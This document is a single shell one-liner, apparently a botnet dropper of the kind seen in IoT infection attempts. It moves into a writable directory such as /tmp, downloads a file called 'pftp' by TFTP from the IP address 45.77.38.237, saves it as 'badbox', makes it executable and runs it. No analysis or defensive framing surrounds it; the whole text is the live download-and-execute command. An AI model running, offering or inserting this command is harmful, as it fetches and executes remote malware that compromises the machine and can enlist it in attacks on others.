cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.77.38.237 -c get pftp;cat pftp >badbox;chmod +x *;./badbox
